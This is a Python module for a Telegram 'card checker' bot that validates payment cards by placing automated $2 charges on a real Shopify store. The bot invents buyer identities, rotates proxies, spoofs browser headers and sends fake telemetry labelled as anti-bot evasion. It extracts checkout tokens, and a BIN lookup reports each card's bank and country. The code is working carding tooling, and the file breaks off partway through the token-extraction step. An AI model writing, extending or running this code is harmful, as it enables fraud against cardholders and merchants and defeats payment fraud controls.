# BOT/gates/charge/shopify/shopify200.py

import json
import asyncio
import re
import time
import random
import string
import base64
import httpx
import urllib.parse
import uuid
from datetime import datetime
from pyrogram import Client, filters
from pyrogram.types import Message
import html
import os
import unicodedata

# Import from helper modules
try:
    from BOT.helper.permissions import auth_and_free_restricted
except ImportError:
    def auth_and_free_restricted(func):
        async def wrapper(client, message):
            return await func(client, message)
        return wrapper

try:
    from BOT.helper.Admins import is_command_disabled, get_command_offline_message
except ImportError:
    def is_command_disabled(command_name: str) -> bool:
        return False
    def get_command_offline_message(command_name: str) -> str:
        return "Command is temporarily disabled."

try:
    from BOT.gc.credit import charge_processor
    CHARGE_PROCESSOR_AVAILABLE = True
except ImportError:
    charge_processor = None
    CHARGE_PROCESSOR_AVAILABLE = False

try:
    from TOOLS.getbin import get_bin_details
except ImportError:
    def get_bin_details(bin_number):
        return {}

try:
    from BOT.helper.filter import extract_cards, normalize_year
    FILTER_AVAILABLE = True
except ImportError:
    FILTER_AVAILABLE = False
    def extract_cards(text):
        cards = []
        for line in text.splitlines():
            parts = line.replace('|', ' ').split()
            if len(parts) >= 4:
                cards.append('|'.join(parts[:4]))
        return cards, list(set(cards))
    def normalize_year(y):
        y = y.strip()
        if len(y) == 4:
            return y[-2:]
        return y

try:
    from BOT.tools.proxy import (
        get_proxy_for_user,
        mark_proxy_success,
        mark_proxy_failed,
        get_random_proxy,
        parse_proxy,
        test_proxy,
        PROXY_ENABLED
    )
    PROXY_SYSTEM_AVAILABLE = True
except ImportError:
    PROXY_SYSTEM_AVAILABLE = False
    def get_proxy_for_user(user_id: int, strategy: str = "random"):
        return None
    def mark_proxy_success(proxy: str, response_time: float):
        pass
    def mark_proxy_failed(proxy: str):
        pass
    def get_random_proxy():
        return None
    def parse_proxy(proxy_str: str):
        return None
    def test_proxy(proxy_str: str):
        return False

# ========== DETAILED LOGGER ==========
class ShopifyLogger:
    def __init__(self, user_id=None):
        self.user_id = user_id
        self.check_id = f"SHP200-{random.randint(1000, 9999)}"
        self.start_time = None
        self.step_counter = 0
        self.logs = []

    def start_check(self, card_details):
        self.start_time = time.time()
        self.step_counter = 0
        cc = card_details.split('|')[0] if '|' in card_details else card_details
        masked_cc = cc[:6] + "******" + cc[-4:] if len(cc) > 10 else cc

        log_msg = f"""
🛒 [SHOPIFY CHARGE 2.00$]
   ├── Check ID: {self.check_id}
   ├── User ID: {self.user_id or 'N/A'}
   ├── Card: {masked_cc}
   ├── Start Time: {datetime.now().strftime('%H:%M:%S')}
   └── Target: shop.kauffmancenter.org (Postcard x2)
        """
        self.add_log(log_msg)
        print(log_msg)
        return log_msg

    def add_log(self, message):
        timestamp = datetime.now().strftime('%H:%M:%S.%f')[:-3]
        self.logs.append(f"[{timestamp}] {message}")

    def step(self, step_num, name, action, details=None, status="PROCESSING"):
        self.step_counter += 1
        elapsed = time.time() - self.start_time if self.start_time else 0

        status_icons = {
            "PROCESSING": "🔄", "SUCCESS": "✅", "FAILED": "❌",
            "WARNING": "⚠️", "INFO": "ℹ️", "CAPTCHA": "🛡️",
            "DECLINED": "⛔", "HUMAN": "👤", "CLICK": "🖱️",
            "TYPE": "⌨️", "WAIT": "⏳"
        }
        status_icon = status_icons.get(status, "➡️")

        log_msg = f"{status_icon} STEP {step_num:02d}: {name}"
        log_msg += f"\n   ├── Action: {action}"
        log_msg += f"\n   ├── Elapsed: {elapsed:.2f}s"
        log_msg += f"\n   ├── Time: {datetime.now().strftime('%H:%M:%S')}"
        if details:
            log_msg += f"\n   └── Details: {details}"

        self.add_log(log_msg)
        print(log_msg)
        print()
        return log_msg

    def data_extracted(self, data_type, value, source=""):
        if isinstance(value, dict):
            value_str = json.dumps(value, indent=2)
            if len(value_str) > 150:
                value_str = value_str[:147] + "..."
        else:
            value_str = str(value)
            if len(value_str) > 100:
                value_str = value_str[:97] + "..."

        log_msg = f"   ├── 📊 Extracted {data_type}: {value_str}"
        if source:
            log_msg += f"\n   │   └── From: {source}"
        self.add_log(log_msg)
        print(log_msg)
        return log_msg

    def card_details_log(self, cc, mes, ano, cvv):
        masked_cc = cc[:6] + "******" + cc[-4:]
        log_msg = f"""
   ├── 💳 Card Details:
   │   ├── Number: {masked_cc}
   │   ├── Expiry: {mes}/{ano}
   │   └── CVV: {'*' * len(cvv)}
        """
        self.add_log(log_msg)
        print(log_msg)
        return log_msg

    def error_log(self, error_type, message, step=""):
        error_icons = {
            "CAPTCHA": "🛡️", "DECLINED": "💳", "FRAUD": "🚫",
            "TIMEOUT": "⏰", "CONNECTION": "🔌", "UNKNOWN": "❓",
            "PROXY": "🔧", "NO_PROXY": "🚫", "PCI": "💳",
            "CHECKOUT_TOKEN": "🎫", "PROCESSING": "⏳"
        }
        error_icon = error_icons.get(error_type, "⚠️")
        log_msg = f"{error_icon} ERROR [{error_type}]: {message}"
        if step:
            log_msg += f"\n   └── At Step: {step}"
        self.add_log(log_msg)
        print(log_msg)
        print()
        return log_msg

    def success_log(self, message, details=""):
        log_msg = f"✅ SUCCESS: {message}"
        if details:
            log_msg += f"\n   └── Details: {details}"
        self.add_log(log_msg)
        print(log_msg)
        return log_msg

    def complete_result(self, success, final_status, response_message, total_time):
        result_icon = "✅" if success else "❌"
        result_text = "APPROVED" if success else "DECLINED"

        if len(response_message) > 100:
            response_display = response_message[:97] + "..."
        else:
            response_display = response_message

        log_msg = f"""
{result_icon} [SHOPIFY CHARGE COMPLETED]
   ├── Check ID: {self.check_id}
   ├── Result: {result_text}
   ├── Final Status: {final_status}
   ├── Steps Completed: {self.step_counter}
   ├── Total Time: {total_time:.2f}s
   ├── Response: {response_display}
   └── End Time: {datetime.now().strftime('%H:%M:%S')}
        """
        summary = f"📊 SUMMARY: {result_icon} {final_status} | {total_time:.2f}s | Steps: {self.step_counter}"
        self.add_log(log_msg)
        self.add_log(summary)
        print(log_msg)
        print(summary)
        print("="*80)
        return log_msg, summary

    def get_all_logs(self):
        return "\n".join(self.logs)


# ========== UTILITY FUNCTIONS ==========
def load_users():
    try:
        with open("DATA/users.json", "r") as f:
            return json.load(f)
    except:
        return {}

def load_owner_id():
    try:
        with open("FILES/config.json", "r") as f:
            return json.load(f).get("OWNER")
    except:
        return None

def get_user_plan(user_id):
    users = load_users()
    if str(user_id) in users:
        return users[str(user_id)].get("plan", {})
    return {}

def is_user_banned(user_id):
    try:
        if not os.path.exists("DATA/banned_users.txt"):
            return False
        with open("DATA/banned_users.txt", "r") as f:
            return str(user_id) in f.read().splitlines()
    except:
        return False

def check_cooldown(user_id, command_type="si"):
    owner_id = load_owner_id()
    if str(user_id) == str(owner_id):
        return True, 0

    try:
        with open("DATA/cooldowns.json", "r") as f:
            cooldowns = json.load(f)
    except:
        cooldowns = {}

    user_key = f"{user_id}_{command_type}"
    current_time = time.time()

    if user_key in cooldowns:
        last_time = cooldowns[user_key]
        user_plan = get_user_plan(user_id)
        antispam = user_plan.get("antispam", 15) or 15

        if current_time - last_time < antispam:
            return False, antispam - (current_time - last_time)

    cooldowns[user_key] = current_time
    try:
        with open("DATA/cooldowns.json", "w") as f:
            json.dump(cooldowns, f, indent=4)
    except:
        pass

    return True, 0

def strip_all_unicode(text):
    try:
        normalized = unicodedata.normalize('NFKD', text)
        ascii_text = normalized.encode('ASCII', 'ignore').decode('ASCII')
    except:
        ascii_text = ''.join(char for char in text if ord(char) < 128)
    cleaned = re.sub(r'[^0-9a-zA-Z\|\s,\/\-]', ' ', ascii_text)
    cleaned = re.sub(r'\s+', ' ', cleaned)
    return cleaned.strip()

def extract_card_from_cleaned_text(text):
    pattern1 = r'(\d{13,16})\s*[|\s]\s*(\d{1,2})\s*[|\s]\s*(\d{2,4})\s*[|\s]\s*(\d{3,4})'
    match = re.search(pattern1, text)
    if match:
        cc, mes, ano, cvv = match.groups()
        if len(ano) == 4:
            ano = ano[-2:]
        mes = mes.zfill(2)
        return [cc, mes, ano, cvv]
    
    pattern2 = r'(\d{13,16})\s*[, ]\s*(\d{1,2})\s*[, ]\s*(\d{2,4})\s*[, ]\s*(\d{3,4})'
    match = re.search(pattern2, text)
    if match:
        cc, mes, ano, cvv = match.groups()
        if len(ano) == 4:
            ano = ano[-2:]
        mes = mes.zfill(2)
        return [cc, mes, ano, cvv]
    
    digits = re.findall(r'\d+', text)
    for i in range(len(digits) - 3):
        potential_cc = digits[i]
        potential_mes = digits[i+1]
        potential_ano = digits[i+2]
        potential_cvv = digits[i+3]
        
        if (13 <= len(potential_cc) <= 16 and 
            len(potential_mes) in [1, 2] and 
            len(potential_ano) in [2, 4] and 
            len(potential_cvv) in [3, 4]):
            try:
                mes_int = int(potential_mes)
                if 1 <= mes_int <= 12:
                    current_year = datetime.now().year % 100
                    if len(potential_ano) == 4:
                        ano_val = int(potential_ano) % 100
                    else:
                        ano_val = int(potential_ano)
                    if current_year - 5 <= ano_val <= current_year + 10:
                        return [potential_cc, potential_mes.zfill(2), potential_ano[-2:], potential_cvv]
            except:
                continue
    return None

def parse_card_input(card_input):
    cleaned_text = strip_all_unicode(card_input)
    result = extract_card_from_cleaned_text(cleaned_text)
    if result:
        return result
    
    if FILTER_AVAILABLE:
        all_cards, unique_cards = extract_cards(card_input)
        if unique_cards:
            card_parts = unique_cards[0].split('|')
            if len(card_parts) == 4:
                cc, mes, ano, cvv = card_parts
                if len(ano) == 4:
                    ano = ano[-2:]
                mes = mes.zfill(2)
                return [cc, mes, ano, cvv]
    
    if '|' in card_input:
        parts = card_input.split('|')
        if len(parts) >= 4:
            cc = re.sub(r'\D', '', parts[0])
            mes = re.sub(r'\D', '', parts[1])
            ano = re.sub(r'\D', '', parts[2])
            cvv = re.sub(r'\D', '', parts[3])
            if cc and mes and ano and cvv:
                if len(ano) == 4:
                    ano = ano[-2:]
                mes = mes.zfill(2)
                return [cc, mes, ano, cvv]
    return None


# ========== FORMAT RESPONSE FUNCTION ==========
def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, user_data, proxy_status="Dead 🚫"):
    fullcc = f"{cc}|{mes}|{ano}|{cvv}"

    try:
        user_id = str(user_data.get("user_id", "Unknown"))
    except:
        user_id = None

    try:
        with open("DATA/sites.json", "r") as f:
            sites = json.load(f)
        gateway = sites.get(user_id, {}).get("gate", "Shopify Charge 2.00$ 🏛️")
    except:
        gateway = "Shopify Charge 2.00$ 🏛️"

    raw_response = str(raw_response) if raw_response else "-"
    
    if "TIMEOUT" in raw_response.upper() or "PCI_ERROR" in raw_response.upper():
        status_flag = "Error❗️"
        response_display = "Try again ♻️"
    else:
        if "DECLINED - " in raw_response:
            response_display = raw_response.split("DECLINED - ")[-1]
            if ":" in response_display:
                response_display = response_display.split(":")[0].strip()
            response_display = response_display.split('\n')[0]
            if len(response_display) > 30:
                response_display = response_display[:27] + "..."
        elif "ORDER_PLACED" in raw_response.upper() or "PROCESSEDRECEIPT" in raw_response:
            response_display = "ORDER_PLACED"
        elif "APPROVED - " in raw_response:
            response_display = "APPROVED"
        elif "GENERIC_ERROR" in raw_response:
            response_display = "GENERIC_ERROR"
        elif "PROXY_DEAD" in raw_response:
            response_display = "PROXY_DEAD"
        elif "NO_PROXY_AVAILABLE" in raw_response:
            response_display = "NO_PROXY_AVAILABLE"
        elif "CAPTCHA" in raw_response.upper():
            response_display = "CAPTCHA"
        elif "3D" in raw_response.upper() or "3DS" in raw_response.upper():
            response_display = "3D_SECURE"
        elif "CARD_DECLINED" in raw_response.upper():
            response_display = "CARD_DECLINED"
        elif "INSUFFICIENT" in raw_response.upper():
            response_display = "INSUFFICIENT_FUNDS"
        elif "INVALID" in raw_response.upper():
            response_display = "INVALID_CARD"
        elif "EXPIRED" in raw_response.upper():
            response_display = "EXPIRED_CARD"
        elif "FRAUD" in raw_response.upper():
            response_display = "FRAUD"
        elif "PROCESSING_TIMEOUT" in raw_response:
            response_display = "PROCESSING_TIMEOUT"
        else:
            if ":" in raw_response:
                response_display = raw_response.split(":")[0].strip()
                if len(response_display) > 30:
                    response_display = response_display[:27] + "..."
            else:
                response_display = raw_response[:30] + "..." if len(raw_response) > 30 else raw_response

        raw_response_upper = raw_response.upper()

        if "NO RECEIPT ID" in raw_response_upper:
            status_flag = "Declined ❌"
        elif any(keyword in raw_response_upper for keyword in [
            "ORDER_PLACED", "SUBMITSUCCESS", "SUCCESSFUL", "APPROVED", "RECEIPT",
            "COMPLETED", "PAYMENT_SUCCESS", "CHARGE_SUCCESS", "THANK_YOU",
            "ORDER_CONFIRMATION", "ORDER_CONFIRMED", "SHOPIFY_PAYMENTS",
            "ORDER #", "PROCESSEDRECEIPT", "THANK YOU", "PAYMENT_SUCCESSFUL",
            "PROCESSINGRECEIPT", "AUTHORIZED"
        ]):
            status_flag = "Charged ✅"
        elif any(keyword in raw_response_upper for keyword in [
            "CAPTCHA", "SOLVE THE CAPTCHA", "CAPTCHA_METADATA_MISSING", 
            "CAPTCHA DETECTED", "CAPTCHA_REQUIRED", "CAPTCHA_VALIDATION_FAILED", 
            "CAPTCHA_ERROR", "BOT_DETECTED", "HUMAN_VERIFICATION", "SECURITY_CHECK",
            "CLOUDFLARE", "RECAPTCHA"
        ]):
            status_flag = "Captcha ⚠️"
        elif any(keyword in raw_response_upper for keyword in [
            "CARD_DECLINED", "THERE WAS AN ISSUE PROCESSING YOUR PAYMENT", 
            "PAYMENT ISSUE", "ISSUE PROCESSING", "CARD WAS DECLINED",
            "YOUR PAYMENT COULDN'T BE PROCESSED", "PAYMENT FAILED"
        ]):
            status_flag = "Declined ❌"
        elif any(keyword in raw_response_upper for keyword in [
            "INSUFFICIENT FUNDS", "INSUFFICIENT_FUNDS", "NOT ENOUGH MONEY"
        ]):
            status_flag = "Declined ❌"
        elif any(keyword in raw_response_upper for keyword in [
            "INVALID CARD", "CARD IS INVALID", "CARD_INVALID", "CARD NUMBER IS INVALID"
        ]):
            status_flag = "Declined ❌"
        elif any(keyword in raw_response_upper for keyword in [
            "EXPIRED", "CARD HAS EXPIRED", "CARD_EXPIRED"
        ]):
            status_flag = "Declined ❌"
        elif any(keyword in raw_response_upper for keyword in [
            "3D", "AUTHENTICATION", "OTP", "VERIFICATION", "CVV-MATCH-OTP", 
            "3DS", "SECURE REQUIRED", "SECURE_CODE", "AUTH_REQUIRED",
            "3DS REQUIRED", "AUTHENTICATION_FAILED", "COMPLETEPAYMENTCHALLENGE",
            "ACTIONREQUIREDRECEIPT", "ADDITIONAL_VERIFICATION_NEEDED",
            "VERIFICATION_REQUIRED", "CARD_VERIFICATION", "AUTHENTICATE"
        ]):
            status_flag = "Approved ❎"
        elif any(keyword in raw_response_upper for keyword in [
            "INVALID CVC", "INCORRECT CVC", "CVC_INVALID", "SECURITY CODE"
        ]):
            status_flag = "Declined ❌"
        elif any(keyword in raw_response_upper for keyword in [
            "FRAUD", "FRAUD_SUSPECTED", "SUSPECTED_FRAUD", "FRAUDULENT",
            "RISKY", "HIGH_RISK", "SECURITY_VIOLATION", "SUSPICIOUS"
        ]):
            status_flag = "Fraud ⚠️"
        elif "NO_PROXY_AVAILABLE" in raw_response_upper or "PROXY_DEAD" in raw_response_upper:
            status_flag = "Proxy Error 🚫"
        else:
            status_flag = "Declined ❌"

    bin_data = get_bin_details(cc[:6]) or {}
    bin_info = {
        "bin": bin_data.get("bin", cc[:6]),
        "country": bin_data.get("country", "Unknown"),
        "flag": bin_data.get("flag", "🏳️"),
        "vendor": bin_data.get("vendor", "Unknown"),
        "type": bin_data.get("type", "Unknown"),
        "level": bin_data.get("level", "Unknown"),
        "bank": bin_data.get("bank", "Unknown")
    }

    try:
        plan = user_data.get("plan", {}).get("plan", "Free")
        badge = user_data.get("plan", {}).get("badge", "🎭")
        first_name = user_data.get("first_name", "User")
    except:
        plan = "Free"
        badge = "🎭"
        first_name = "User"

    clean_name = re.sub(r'[↑←«~∞🏴]', '', first_name).strip()
    profile_display = f"『{badge}』{clean_name}"

    result = f"""
<b>[#Shopify Charge 2.00$] | WAYNE</b> ✦
━━━━━━━━━━━━━━━
<b>[•] Card</b>- <code>{fullcc}</code>
<b>[•] Gateway</b> - <b>Shopify Charge 2.00$</b>
<b>[•] Status</b>- <code>{status_flag}</code>
<b>[•] Response</b>- <code>{response_display}</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Bin</b>: <code>{bin_info['bin']}</code>  
<b>[+] Info</b>: <code>{bin_info['vendor']} - {bin_info['type']} - {bin_info['level']}</code> 
<b>[+] Bank</b>: <code>{bin_info['bank']}</code> 🏦
<b>[+] Country</b>: <code>{bin_info['country']} - [{bin_info['flag']}]</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[ﾒ] Checked By</b>: {profile_display} [<code>{plan} {badge}</code>]
<b>[ϟ] Dev</b> ➺</b> <b><i>DADYY</i></b>
━━━━━━━━━━━━━━━
<b>[ﾒ] T/t</b>: <code>[{timet:.2f} 𝐬]</code> <b>|P/x:</b> [<code>{proxy_status}</code>]
"""
    return result


# ========== COMPLETE SUBMITFORCOMPLETION MUTATION ==========
SUBMIT_MUTATION = '''mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{...on NegotiationError{code localizedMessage __typename}...on PendingTermViolation{code localizedMessage nonLocalizedMessage __typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token __typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}'''

POLL_MUTATION = '''query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl orderIdentity{buyerIdentifier id __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}__typename}__typename}__typename}'''


# ========== SHOPIFY KAUFFMAN CENTER CHECKOUT CLASS ==========
class ShopifyKauffmanCheckout:
    def __init__(self, user_id=None):
        self.user_id = user_id
        self.base_url = "https://shop.kauffmancenter.org"
        self.product_handle = "kauffman-center-postcard"
        self.variant_id = "46767629271319"
        self.product_id = "8667052441879"
        self.shop_id = "82514608407"
        self.shop_domain = "shop.kauffmancenter.org"
        
        self.proxy_url = None
        self.proxy_status = "Dead 🚫"
        self.proxy_used = False

        self.client = None
        self.cookie_jar = {}

        # Dynamic data
        self.checkout_token = None
        self.session_token = None
        self.signature = None
        self.stable_id = None
        self.queue_token = None
        self.vault_id = None
        self.checkout_url = None
        self.graphql_base = None
        self.build_id = None
        self.pci_build_hash = "a8e4a94"
        
        # Extracted from checkout page
        self.client_id = None
        self.visit_token = None
        self.cart_token = None
        self.payment_method_identifier = None

        self.logger = ShopifyLogger(user_id)

        self.first_names = ["James", "Robert", "John", "Michael", "David", "William", "Richard", 
                           "Joseph", "Thomas", "Charles", "Daniel", "Matthew", "Anthony", "Mark", 
                           "Donald", "Steven", "Paul", "Andrew", "Kenneth", "Joshua", "Kevin", 
                           "Brian", "George", "Timothy", "Ronald", "Edward", "Jason", "Jeffrey",
                           "Casey", "Bruce", "Tony", "Steve", "Peter", "Clark"]
        self.last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", 
                          "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", 
                          "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin", 
                          "Lee", "Perez", "Thompson", "White", "Harris", "Sanchez", "Clark", "Lang"]

        self.first_name = random.choice(self.first_names)
        self.last_name = random.choice(self.last_names)
        self.full_name = f"{self.first_name} {self.last_name}"
        self.email = f"{self.first_name.lower()}{self.last_name.lower()}{random.randint(10,999)}@gmail.com"

        self.address = {
            "address1": "1601 Broadway Blvd",
            "address2": "",
            "city": "Kansas City",
            "zoneCode": "MO",
            "postalCode": "64108",
            "countryCode": "US",
            "phone": f"+1816{random.randint(100,999)}{random.randint(1000,9999)}",
            "company": "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=5)),
            "firstName": self.first_name,
            "lastName": self.last_name
        }

        self.UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36'
        self.CH_UA = '"Google Chrome";v="147", "Not.A/Brand";v="8", "Chromium";v="147"'

    def generate_random_string(self, length=16):
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

    def generate_uuid(self):
        return str(uuid.uuid4())

    def get_headers(self, extra=None):
        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'sec-ch-ua': self.CH_UA,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': self.UA,
            'priority': 'u=1, i'
        }
        if extra:
            headers.update(extra)
        return headers

    def step(self, num, name, action, details=None, status="PROCESSING"):
        return self.logger.step(num, name, action, details, status)

    # ============ STEP 1: INITIALIZE SESSION / GET COOKIES ============
    async def init_session(self):
        """Step 1: Hit cart.js to get session cookies"""
        self.step(1, "INIT SESSION", "Getting session cookies from /cart.js")
        
        try:
            resp = await self.client.get(
                f"{self.base_url}/cart.js",
                headers=self.get_headers(),
                timeout=25
            )
            
            # Extract cookies
            self.client_id = self.client.cookies.get('_shopify_y') or str(uuid.uuid4())
            self.visit_token = self.client.cookies.get('_shopify_s') or str(uuid.uuid4())
            
            try:
                cart_data = resp.json()
                self.cart_token = cart_data.get('token', '')
            except:
                self.cart_token = ''
            
            self.logger.data_extracted("Session", f"Client ID: {self.client_id[:15]}...", "Cookies extracted")
            return True
        except Exception as e:
            self.logger.error_log("SESSION", str(e))
            return False

    # ============ STEP 2: FIND CHEAPEST PRODUCT (DYNAMIC) ============
    async def find_product(self):
        """Step 2: Find cheapest available product - but use hardcoded for Kauffman"""
        self.step(2, "FIND PRODUCT", "Using known product: Kauffman Center Postcard")
        
        # Try to verify product exists
        try:
            resp = await self.client.get(
                f"{self.base_url}/products/{self.product_handle}.json",
                headers=self.get_headers(),
                timeout=25
            )
            if resp.status_code == 200:
                data = resp.json()
                product = data.get('product', {})
                variants = product.get('variants', [])
                if variants:
                    self.variant_id = str(variants[0].get('id', self.variant_id))
                    self.logger.data_extracted("Product", f"Variant: {self.variant_id}", "Verified")
            return True
        except:
            # Fallback to hardcoded
            self.logger.data_extracted("Product", f"Variant: {self.variant_id}", "Using hardcoded")
            return True

    # ============ STEP 3: ADD TO CART ============
    async def add_to_cart(self):
        """Step 3: Add 2x postcards to cart"""
        self.step(3, "ADD TO CART", "Adding 2x Kauffman Center Postcard")
        
        headers = self.get_headers({
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'x-requested-with': 'XMLHttpRequest',
            'origin': self.base_url,
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin'
        })
        
        data = {
            'id': self.variant_id,
            'quantity': 2,
            'form_type': 'product',
            'utf8': '✓'
        }
        
        try:
            resp = await self.client.post(
                f"{self.base_url}/cart/add.js",
                headers=headers,
                data=data,
                timeout=25
            )
            if resp.status_code == 200:
                j = resp.json()
                self.cart_token = j.get('cart_token', self.cart_token)
                self.logger.data_extracted("Cart", f"Token: {self.cart_token[:15] if self.cart_token else 'N/A'}...", "Added")
                return True
            self.logger.error_log("CART", f"Status: {resp.status_code}")
            return False
        except Exception as e:
            self.logger.error_log("CART", str(e))
            return False

    # ============ STEP 4: SEND MONORAIL/TELEMETRY EVENTS ============
    async def send_telemetry(self):
        """Step 4: Send monorail produce batch events"""
        self.step(4, "TELEMETRY", "Sending monorail events")
        
        headers = self.get_headers({
            'content-type': 'text/plain;charset=UTF-8',
            'origin': self.base_url,
            'sec-fetch-mode': 'no-cors',
            'priority': 'u=4, i'
        })
        
        now_ms = int(time.time() * 1000)
        
        for event_name in ["product_added_to_cart", "checkout_started"]:
            event_id = f"sh-{str(uuid.uuid4()).upper()[:23]}"
            body = {
                "events": [{
                    "schema_id": f"storefront_customer_tracking/4.27",
                    "payload": {
                        "api_client_id": 580111,
                        "event_id": event_id,
                        "event_name": event_name,
                        "shop_id": int(self.shop_id),
                        "total_value": 2,
                        "currency": "USD",
                        "event_time": now_ms,
                        "event_source_url": self.base_url,
                        "unique_token": self.client_id,
                        "page_id": str(uuid.uuid4()).upper(),
                        "deprecated_visit_token": self.visit_token,
                        "session_id": f"sh-{str(uuid.uuid4()).upper()[:23]}",
                        "source": "trekkie-storefront-renderer",
                        "ccpa_enforced": True,
                        "gdpr_enforced": False,
                        "is_persistent_cookie": True,
                        "analytics_allowed": True,
                        "marketing_allowed": True,
                        "sale_of_data_allowed": False,
                        "preferences_allowed": True,
                        "shopify_emitted": True
                    },
                    "metadata": {"event_created_at_ms": now_ms}
                }],
                "metadata": {"event_sent_at_ms": now_ms}
            }
            try:
                await self.client.post(
                    f"{self.base_url}/.well-known/shopify/monorail/unstable/produce_batch",
                    headers=headers,
                    content=json.dumps(body),
                    timeout=15
                )
            except:
                pass
        
        self.logger.data_extracted("Telemetry", "Monorail events sent", "Anti-bot")
        return True

    # ============ STEP 5: VIEW CART PAGE ============
    async def view_cart_page(self):
        """Step 5: View cart page to get valid session"""
        self.step(5, "VIEW CART", "Viewing cart page")
        
        headers = self.get_headers({
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'priority': 'u=0, i'
        })
        
        try:
            resp = await self.client.get(f"{self.base_url}/cart", headers=headers, timeout=25)
            self.logger.data_extracted("Cart Page", f"Status: {resp.status_code}", "Viewed")
            return True
        except Exception as e:
            self.logger.error_log("CART_PAGE", str(e))
            return False

    # ============ STEP 6: REFRESH CART ============
    async def refresh_cart(self):
        """Step 6: Refresh cart.js to update token"""
        self.step(6, "REFRESH CART", "Refreshing cart token")
        
        headers = self.get_headers({
            'referer': f"{self.base_url}/cart"
        })
        
        try:
            resp = await self.client.get(f"{self.base_url}/cart.js", headers=headers, timeout=25)
            if resp.status_code == 200:
                data = resp.json()
                self.cart_token = data.get('token', self.cart_token)
                self.logger.data_extracted("Cart Token", self.cart_token[:15] if self.cart_token else "N/A", "Refreshed")
            return True
        except:
            return True

    # ============ STEP 7: START CHECKOUT ============
    async def start_checkout(self):
        """Step 7: Start checkout - POST to /cart to get checkout URL"""
        self.step(7, "START CHECKOUT", "Starting checkout process")
        
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'cache-control': 'max-age=0',
            'origin': self.base_url,
            'referer': f"{self.base_url}/cart",
            'priority': 'u=0, i',
            'sec-ch-ua': self.CH_UA,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': self.UA
        }
        
        data = f'updates%5B%5D=1&checkout=&cart_token={self.cart_token or ""}'
        
        try:
            resp = await self.client.post(
                f"{self.base_url}/cart",
                headers=headers,
                content=data,
                timeout=25,
                follow_redirects=True
            )
            
            self.checkout_url = str(resp.url)
            match = re.search(r'/checkouts/(?:cn/)?([a-zA-Z0-9]+)', self.checkout_url)
            if match:
                self.checkout_token = match.group(1)
                self.logger.data_extracted("Checkout Token", self.checkout_token[:15] + "...", "URL")
                # Set graphql_base
                parsed = urllib.parse.urlparse(self.checkout_url)
                if 'shopify.com' in parsed.netloc:
                    self.graphql_base = f"{parsed.scheme}://{parsed.netloc}"
                else:
                    self.graphql_base = self.base_url
                return True
            return False
        except Exception as e:
            self.logger.error_log("CHECKOUT_START", str(e))
            return False

    # ============ STEP 8: EXTRACT TOKENS FROM CHECKOUT PAGE ============
    async def extract_checkout_tokens(self):
        """Step 8: Extract ALL tokens from checkout page HTML"""
        self.step(8, "EXTRACT TOKENS", "Extracting session tokens from checkout page")
        
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'sec-ch-ua': self.CH_UA,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': self.UA,
            'priority': 'u=0, i'
        }
        
